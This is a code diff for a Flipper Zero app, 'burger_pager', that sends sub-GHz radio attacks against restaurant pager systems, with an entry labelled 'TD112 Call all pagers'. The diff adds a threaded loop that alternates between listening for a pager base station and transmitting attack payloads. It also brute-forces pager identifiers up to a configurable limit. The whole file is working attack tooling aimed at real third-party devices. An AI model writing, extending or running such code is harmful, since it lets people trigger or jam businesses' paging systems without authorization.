@@ -13,6 +13,8 @@
 #include "helpers/string.h"
 #include "helpers/log.h"
 
+#define SEND_ATTACK_DURATION_MS  10000
+
 static Attack attacks[] = {
     {
         .title = "TD112 Call all pagers",
@@ -176,17 +178,19 @@ static void subghz_receiver_callback(
 
         const Protocol* protocol = attacks[state->index].protocol;
         protocol->process_packet(size, packet, payload);
+        state->packet_found = true;
     }
     subghz_receiver_reset(receiver);
 }
 
-void subghz_find_station(State* state) {
+static int32_t subghz_find_station_thread(void* _state) {
+    State* state = _state;
     Payload* payload = &attacks[state->index].payload;
 
     furi_hal_power_suppress_charge_enter();
 
     subghz_receiver_set_filter(state->receiver, SubGhzProtocolFlag_Decodable);
-    subghz_receiver_set_rx_callback(state->receiver, subghz_receiver_callback, NULL);
+    subghz_receiver_set_rx_callback(state->receiver, subghz_receiver_callback, state);
 
     furi_hal_subghz_reset();
     subghz_devices_load_preset(state->device, FuriHalSubGhzPresetOok650Async, NULL);
@@ -201,7 +205,7 @@ void subghz_find_station(State* state) {
         payload->bits,
         payload->frequency);
 
-    while(true) {
+    while(state->find_station_running) {
         LevelDuration level_duration;
         size_t received =
             furi_stream_buffer_receive(state->stream, &level_duration, sizeof(LevelDuration), 100);
@@ -210,33 +214,80 @@ void subghz_find_station(State* state) {
             uint32_t duration = level_duration_get_duration(level_duration);
             subghz_receiver_decode(state->receiver, level, duration);
         }
+
+        if(!state->find_station_running) {
+            break;
+        }
     }
 
     furi_hal_subghz_stop_async_rx();
     furi_hal_subghz_sleep();
+
+    return 0;
+}
+
+static void stop_attack(State* state) {
+    if(state->find_station_thread) {
+        state->find_station_running = false;
+        furi_thread_join(state->find_station_thread);
+        furi_thread_free(state->find_station_thread);
+        state->find_station_thread = NULL;
+    }
+    if(subghz_devices_is_async_complete_tx(state->device)) {
+        subghz_devices_stop_async_tx(state->device);
+    }
 }
 
 static void start_attack(State* state) {
-    subghz_send_attack(state);
-    if(false) {
-        subghz_find_station(state);
+    uint32_t current_time = furi_get_tick();
+    uint32_t elapsed_time = current_time - state->last_switch_time;
+
+    if(state->is_find_station) {
+        if(state->packet_found) {
+            state->packet_found = false;
+            if(state->find_station_thread) {
+                state->find_station_running = false;
+                furi_thread_join(state->find_station_thread);
+                furi_thread_free(state->find_station_thread);
+                state->find_station_thread = NULL;
+            }
+            state->is_find_station = false;
+            state->last_switch_time = current_time;
+        } else {
+            if(state->find_station_thread == NULL) {
+                state->find_station_running = true;
+                state->find_station_thread =
+                    furi_thread_alloc_ex("FindStation", 1024, subghz_find_station_thread, state);
+                furi_thread_start(state->find_station_thread);
+            }
+        }
+    } else {
+        if(elapsed_time >= SEND_ATTACK_DURATION_MS) {
+            state->is_find_station = true;
+            state->last_switch_time = current_time;
+            if(subghz_devices_is_async_complete_tx(state->device)) {
+                subghz_devices_stop_async_tx(state->device);
+            }
+        } else {
+            subghz_send_attack(state);
+        }
     }
 }
 
 static int32_t adv_thread(void* _ctx) {
     State* state = _ctx;
-    Payload* payload = &attacks[state->index].payload;
-    const Protocol* protocol = attacks[state->index].protocol;
     start_blink(state);
-    if(subghz_devices_is_async_complete_tx(state->device)) {
-        subghz_devices_stop_async_tx(state->device);
-    }
+    state->last_switch_time = furi_get_tick();
+    state->is_find_station = true;
 
     while(state->advertising) {
+        Payload* payload = &attacks[state->index].payload;
+        const Protocol* protocol = attacks[state->index].protocol;
+
         if(protocol &&
            (payload->mode == PayloadModeBruteforce ||
             payload->mode == PayloadModeFindAndBruteforce) &&
-           payload->bruteforce.counter++ >= 10) {
+           payload->bruteforce.counter++ >= payload->bruteforce.counter_limit) {
             payload->bruteforce.counter = 0;
             payload->bruteforce.value =
                 (payload->bruteforce.value + 1) % (1 << (payload->bruteforce.size * 8));
@@ -244,10 +295,12 @@ static int32_t adv_thread(void* _ctx) {
 
         start_attack(state);
 
-        furi_thread_flags_wait(true, FuriFlagWaitAny, delays[state->delay]);
-        subghz_devices_stop_async_tx(state->device);
+        if(subghz_devices_is_async_complete_tx(state->device)) {
+            subghz_devices_stop_async_tx(state->device);
+        }
     }
 
+    stop_attack(state);
     stop_blink(state);
     return 0;
 }
@@ -255,7 +308,6 @@ static int32_t adv_thread(void* _ctx) {
 static void toggle_adv(State* state) {
     if(state->advertising) {
         state->advertising = false;
-        furi_thread_flags_set(furi_thread_get_id(state->thread), true);
         furi_thread_join(state->thread);
     } else {
         state->advertising = true;
@@ -714,7 +766,7 @@ int32_t state_free(State* state) {
 }
 int32_t burger_pager(void* p) {
     UNUSED(p);
-    State* state = malloc(sizeof(State));
+    State* state = calloc(1, sizeof(State));
     furi_assert(state != NULL);
 
     init_subghz(state);
@@ -725,6 +777,8 @@ int32_t burger_pager(void* p) {
     furi_thread_set_stack_size(state->thread, 2048);
     state->ctx.led_indicator = true;
     state->lock_timer = furi_timer_alloc(lock_timer_callback, FuriTimerTypeOnce, state);
+    state->last_switch_time = furi_get_tick();
+    state->is_find_station = true;
 
     state->ctx.notification = furi_record_open(RECORD_NOTIFICATION);
     Gui* gui = furi_record_open(RECORD_GUI);
